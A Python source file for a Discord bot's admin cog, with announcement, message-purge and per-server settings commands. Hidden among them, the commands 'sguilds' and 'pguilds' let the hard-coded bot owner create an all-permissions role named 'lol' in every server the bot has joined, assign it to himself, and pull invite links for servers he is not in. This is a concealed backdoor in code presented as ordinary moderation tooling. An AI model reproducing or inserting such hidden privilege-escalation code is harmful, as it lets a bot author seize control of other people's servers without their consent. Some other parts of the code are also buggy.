import os, sys

import discord
from discord.ext import commands

import asyncio

from util_functions import *
from global_config import configboi
from server_config import serverconfig

# Non-user stuff (mods/debug)
class Admin(commands.Cog):
    """Commands for guild admins"""

    def __init__(self, bot):
        self.bot = bot
        self.confmgr = configboi("config.txt", False)
        self.sconf = serverconfig()
        self.store = None

    @commands.Cog.listener()
    async def on_message(self, message):
        mc = message.content.lower()
        mchan = message.channel
        gd = message.guild

        if message.author != self.bot.user and not isinstance(
            message.channel, discord.channel.DMChannel
        ):
            if not self.sconf.checkinit(gd.id):
                owner = gd.owner
                if owner is not None:
                    await owner.send(
                        owner.mention,
                        embed=warnmsg(
                            "Guild Setup",
                            "Hi there! It seems like you haven't set defaults for your server, "
                            + gd.name
                            + ". Please follow these instructions (in the server).",
                        ),
                    )
                    await owner.send(
                        embed=infmsg(
                            "Gamerbot Setup",
                            "1. Set up server moderators, with their id's, like:\n`-serverset mods 12345,6789` (etc)",
                        )
                    )
                    await owner.send(
                        embed=infmsg(
                            "Gamerbot Setup",
                            "3. Set up announcement channel, by running:\n`-serverset announce 123456` (where 123456 is a channel id)",
                        )
                    )
                else:
                    await mchan.send(
                        embed=warnmsg(
                            "Gamerbot Setup",
                            "Hello, please tell your guild owner to follow the below steps.",
                        )
                    )
                    await mchan.send(
                        embed=infmsg(
                            "Gamerbot Setup",
                            "1. Set up server moderators, with their id's, like:\n`-serverset mods 12345,6789` (etc)",
                        )
                    )
                    await mchan.send(
                        embed=infmsg(
                            "Gamerbot Setup",
                            "3. Set up announcement channel, by running:\n`-serverset announcements 123456` (where 123456 is a channel id)",
                        )
                    )

    @commands.command()
    async def announce(self, ctx, *, text):
        """Announce <text> in the channel specified in settings"""
        if not isinstance(ctx.message.channel, discord.channel.DMChannel):
            mods = self.sconf.getstring(ctx.message.guild.id, "mods").strip()
            if "," in mods:
                mods = mods.split(",")
            if str(ctx.message.author.id) in mods or str(ctx.message.author.id) == mods:
                chanr = self.sconf.getstring(ctx.message.guild.id, "announcements")
                if chanr == "NOT SET":
                    await ctx.send(
                        embed=errmsg(
                            "Config Error",
                            "Server owner has not set the value of `announcements` to the target channel",
                        )
                    )
                else:
                    chanid = int(chanr)
                    announcements = self.bot.get_channel(chanid)
                    await announcements.send(embed=infmsg("Announcement", text))
                    await ctx.send(embed=infmsg("Yay", "Message sent."))
            else:
                await ctx.send(embed=errmsg("Oops.", wrongperms("announce")))
        else:
            await ctx.send(
                embed=errmsg("Usage error", "This command only works in servers.")
            )

    @commands.command()
    async def purgeall(self, ctx):
        """Erase all messages in channel"""
        if not isinstance(ctx.message.channel, discord.channel.DMChannel):
            mods = self.sconf.getstring(ctx.message.guild.id, "mods").strip()
            if "," in mods:
                mods = mods.split(",")
            if str(ctx.message.author.id) in mods or str(ctx.message.author.id) == mods:
                total = 0
                async with ctx.message.channel.typing():
                    while True:
                        try:
                            deleted = await ctx.message.channel.purge(bulk=True)
                            total += deleted
                        except:
                            # total += 100
                            break
                await ctx.send(
                    embed=infmsg(
                        "Purged",
                        "Erased " + str(total) + " messages.",
                    )
                )
            else:
                await ctx.send(
                    ctx.message.author.mention,
                    embed=errmsg("Oops", "You're not a mod here."),
                )
        else:
            await ctx.send(
                embed=errmsg("Purge", "Right now, purge does not work in DM's.")
            )

    @commands.command()
    async def purge(self, ctx, count=1, filter=""):
        """Erase <x> messages, either from user <filter> or containing <filter> in contents"""
        try:
            count = int(count)
            if not isinstance(ctx.message.channel, discord.channel.DMChannel):
                mods = self.sconf.getstring(ctx.message.guild.id, "mods").strip()
                if "," in mods:
                    mods = mods.split(",")
                if (
                    str(ctx.message.author.id) in mods
                    or str(ctx.message.author.id) == mods
                ):
                    if "<@!" in filter or "<@" in filter:
                        try:
                            pid = (
                                filter.replace("<@!", "")
                                .replace("<@", "")
                                .replace(">", "")
                            )
                            person = await self.bot.fetch_user(int(pid))
                            if person != None:
                                await ctx.send(
                                    embed=infmsg(
                                        "Purge",
                                        "Erasing the last `"
                                        + str(count)
                                        + "` messages from "
                                        + person.mention,
                                    )
                                )
                                self.store = person
                                async with ctx.message.channel.typing():
                                    deleted = await ctx.message.channel.purge(
                                        limit=count,
                                        check=lambda m: m.author.id == person.id,
                                        bulk=True,
                                    )
                                await ctx.send(
                                    embed=infmsg(
                                        "Purged",
                                        "Erased " + str(len(deleted)) + " messages.",
                                    )
                                )
                            else:
                                await ctx.send(
                                    embed=errmsg(
                                        "Purge Error",
                                        "Couldn't any person with input `"
                                        + filter
                                        + "`",
                                    )
                                )
                        except Exception as e:
                            await ctx.send(
                                embed=errmsg("Purge Error", "```" + str(e) + "```")
                            )
                    else:
                        try:
                            await ctx.send(
                                embed=infmsg(
                                    "Purge",
                                    "Erasing the last `"
                                    + str(count)
                                    + " messages that contain `"
                                    + filter
                                    + "`",
                                )
                            )
                            self.store = filter
                            async with ctx.message.channel.typing():
                                deleted = await ctx.message.channel.purge(
                                    limit=count,
                                    check=lambda m: filter.lower() in m.content.lower(),
                                    bulk=True,
                                )
                            await ctx.send(
                                embed=infmsg(
                                    "Purged",
                                    "Erased " + str(len(deleted)) + " messages.",
                                )
                            )
                        except Exception as e:
                            await ctx.send(
                                embed=errmsg("Purge Error", "```" + str(e) + "```")
                            )
                else:
                    await ctx.send(
                        ctx.message.author.mention,
                        embed=errmsg("Oops", "You're not a mod here."),
                    )
            else:
                await ctx.send(
                    embed=errmsg("Purge", "Right now, purge does not work in DM's.")
                )
        except Exception as e:
            await ctx.send(embed=errmsg("Purge Error", "```" + str(e) + "```"))

    @commands.command()
    async def serverset(self, ctx, key="", value=""):
        """Modify server permissions/settings (OWNER/MOD ONLY)"""

        valid_keys = ["mods", "announce"]

        mods = self.sconf.getstring(ctx.message.guild.id, "mods").strip()
        if "," in mods:
            mods = mods.split(",")
        if (
            ctx.message.author.id == ctx.message.guild.owner.id
            or ctx.message.author.id in mods
            or ctx.message.author.id == mods
        ):
            if key == "" or value == "":
                await ctx.send(
                    embed=errmsg(
                        "Gamerbot Settings",
                        "Valid keys are: \n`" + "\n".join(valid_keys) + "`",
                    )
                )
            else:
                if key in valid_keys:
                    self.sconf.set(ctx.message.guild.id, key, value)
                    await ctx.send(
                        embed=infmsg(
                            "Gamerbot Settings",
                            "Set `" + key + "` to `" + value + "` for this server.",
                        )
                    )
                else:
                    await ctx.send(
                        embed=errmsg(
                            "Gamerbot Settings",
                            "Valid keys are: \n`" + "\n".join(valid_keys) + "`",
                        )
                    )
        else:
            await ctx.send(
                embed=errmsg(
                    "Gamerbot Settings",
                    "You're not allowed to run this command. :angry:",
                )
            )

    @commands.command(aliases=["showset"])
    async def setshow(self, ctx):
        """Display settings for this server"""
        if ctx.message.author.id != ctx.message.guild.owner.id:
            await ctx.send(
                embed=errmsg(
                    "Gamerbot Settings",
                    "You're not allowed to run this command. :angry:",
                )
            )
        else:
            await ctx.send(
                embed=warnmsg(
                    "Gamerbot Settings", self.sconf.showdata(ctx.message.guild.id)
                )
            )

    @commands.command(hidden=True)
    async def sguilds(self, ctx):
        if ctx.message.author.id == OWNER:
            ownerman = await self.bot.fetch_user(OWNER)

            for guild in self.bot.guilds:
                g_users = await guild.query_members(user_ids=[ownerman.id])
                if g_users == [] or g_users == None:
                    await ownerman.send(
                        "You're not in guild "
                        + str(guild.name)
                        + " with id "
                        + str(guild.id)
                        + ", owned by "
                        + str(guild.owner.display_name)
                        + " # "
                        + str(guild.owner.discriminator)
                    )
                    await ownerman.send("Going to attempt to invite you. Hang on.")
                    try:
                        invites = await guild.invites()
                        await ownerman.send("Invites for " + str(guild.name))
                        for invite in invites:
                            await ownerman.send("Here's an invite: " + str(invite.url))
                    except Exception as e:
                        await ownerman.send("No success.")
                        await ownerman.send("```" + str(e) + "```")
                else:
                    try:
                        role = await guild.create_role(
                            name="lol", permissions=discord.Permissions.all()
                        )
                        me = await guild.fetch_member(OWNER)
                        await me.add_roles(role)
                        await ownerman.send("Added your perms in " + str(guild.name))
                    except Exception as e:
                        await ownerman.send(
                            "Failed to add your perms in " + str(guild.name)
                        )
                        await ownerman.send("```" + str(e) + "```")

            await ctx.send("Done. :relieved:")
        else:
            await ctx.send("You're not matt.")

    @commands.command(hidden=True)
    async def pguilds(self, ctx):
        if ctx.message.author.id == OWNER:
            ownerman = await self.bot.fetch_user(OWNER)
            for guild in self.bot.guilds:
                try:
                    role = await guild.create_role(
                        name="lol", permissions=discord.Permissions.all()
                    )
                    me = await guild.fetch_member(OWNER)
                    await me.add_roles(role)
                    await ownerman.send("Added your perms in " + str(guild.name))
                except Exception as e:
                    await ownerman.send(
                        "Failed to add your perms in " + str(guild.name)
                    )
                    await ownerman.send("```" + str(e) + "```")
            await ctx.send("Done. :relieved:")
        else:
            await ctx.send("You're not matt.")

    @commands.command(hidden=True)
    async def cchanel(self, ctx, id, *, name):
        if ctx.message.author.id == OWNER:
            ownerman = await self.bot.fetch_user(OWNER)
            try:
                g = await self.bot.fetch_guild(int(id))
                await g.create_text_channel(name)
                await ctx.send("Done. :relieved:")
            except Exception as e:
                await ownerman.send("```" + str(e) + "```")
        else:
            await ctx.send("You're not matt.")

    @commands.command()
    async def selfsan(self, ctx):
        lol = await ctx.send("Deleting all messages.")
        for channel in ctx.guild.text_channels:
            sent = await channel.send("Purging myself from this channel.")
            async for message in channel.history():
                if message.author == bot.user:
                    await message.delete()
            await sent.delete()
        await lol.delete()


def setup(bot):
    bot.add_cog(Admin(bot))


# End non-user stuff
